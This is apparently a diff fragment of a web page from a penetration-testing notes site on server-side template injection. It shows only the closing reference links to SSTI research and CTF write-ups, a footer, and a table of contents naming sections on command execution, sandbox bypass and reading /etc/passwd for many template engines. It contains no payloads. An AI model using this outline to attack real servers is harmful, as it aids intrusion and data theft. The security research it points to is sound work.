+  <a href="https://gist.github.com/Yas3r/7006ec36ffb987cbfb98">Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</a></li>
+<li>
+  <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</a></li>
+<li>
+  <a href="https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/">VelocityServlet Expression Language injection</a></li>
+<li>
+  <a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 • By phosphore</a></li>
+<li>
+  <a href="https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad">RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug</a></li>
+<li>
+  <a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw">RCE in Hubspot with EL injection in HubL - @fyoorer</a></li>
+<li>
+  <a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</a></li>
+<li>
+  <a href="https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9">Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</a></li>
+<li>
+  <a href="https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf">EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018</a></li>
+<li>
+  <a href="https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/">Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019</a></li>
+<li>
+  <a href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-%28SSTI%29-in-ASP.NET-Razor/">Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020</a></li>
+<li>
+  <a href="https://portswigger.net/kb/issues/00100f20_expression-language-injection">Expression Language injection - PortSwigger</a></li>
+<li>
+  <a href="https://securitylab.github.com/research/bean-validation-RCE">Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab</a></li>
+<li>
+  <a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019</a></li>
+<li>
+  <a href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">Handlebars template injection and RCE in a Shopify app </a></li>
+<li>
+  <a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit">Lab: Server-side template injection in an unknown language with a documented exploit</a></li>
+<li>
+  <a href="https://www.softwaresecured.com/exploiting-less-js/">Exploiting Less.js to Achieve RCE</a></li>
+<li>
+  <a href="https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti">A Pentester&rsquo;s Guide to Server Side Template Injection (SSTI)</a></li>
+<li>
+  <a href="https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf">Django Templates Server-Side Template Injection</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/server_side_template_injection.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#methodology">Methodology</a></li>
+        <li><a href="#detection">Detection</a>
+          <ul>
+            <li><a href="#need-bugfix-for-this-polyglot">NEED BUGFIX FOR THIS POLYGLOT</a></li>
+          </ul>
+        </li>
+        <li><a href="#aspnet-razor">ASP.NET Razor</a>
+          <ul>
+            <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
+            <li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#expression-language-el">Expression Language EL</a>
+          <ul>
+            <li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+            <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
+            <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#freemarker">Freemarker</a>
+          <ul>
+            <li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
+            <li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
+            <li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
+            <li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#groovy">Groovy</a>
+          <ul>
+            <li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
+            <li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
+            <li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
+            <li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
+            <li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#handlebars">Handlebars</a>
+          <ul>
+            <li><a href="#need-bugfix-for-handlebars">NEED BUGFIX FOR HANDLEBARS</a></li>
+          </ul>
+        </li>
+        <li><a href="#jade--codepen">Jade / Codepen</a></li>
+        <li><a href="#java">Java</a>
+          <ul>
+            <li><a href="#java---basic-injection">Java - Basic injection</a></li>
+            <li><a href="#need-bugfix-for-some-java">NEED BUGFIX FOR SOME JAVA</a></li>
+            <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
+            <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
+          </ul>
+        </li>
+        <li><a href="#django-templates">Django Templates</a>
+          <ul>
+            <li><a href="#need-bugfix-for-django">NEED BUGFIX FOR DJANGO</a></li>
+          </ul>
+        </li>
+        <li><a href="#jinja2">Jinja2</a>
+          <ul>
+            <li><a href="#need-bugfix-for-jinja2">NEED BUGFIX FOR JINJA2</a></li>
+          </ul>
+        </li>
+        <li><a href="#jinjava">Jinjava</a>
+          <ul>
+            <li><a href="#need-bugfix-for-jinjava">NEED BUGFIX FOR JINJAVA</a></li>
+          </ul>
+        </li>
+        <li><a href="#lessjs">Lessjs</a>
+          <ul>
+            <li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
+            <li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
+            <li><a href="#plugins">Plugins</a></li>
+          </ul>
+        </li>
+        <li><a href="#mako">Mako</a>
+          <ul>
+            <li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
+          </ul>
+        </li>
+        <li><a href="#pebble">Pebble</a>
+          <ul>
+            <li><a href="#need-bugfix-for-pebble">NEED BUGFIX FOR PEBBLE</a></li>
+          </ul>
+        </li>
+        <li><a href="#ruby">Ruby</a>
+          <ul>
+            <li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
+            <li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
+            <li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
+            <li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
+          </ul>
+        </li>
+        <li><a href="#smarty">Smarty</a></li>
+        <li><a href="#twig">Twig</a>
+          <ul>
+            <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
+            <li><a href="#need-bugfix-for-twig">NEED BUGFIX FOR TWIG</a></li>
+            <li><a href="#twig---template-format">Twig - Template format</a></li>
+          </ul>
+        </li>
+        <li><a href="#velocity">Velocity</a></li>
+        <li><a href="#pattemplate">patTemplate</a></li>
+        <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
+        <li><a href="#plates">Plates</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
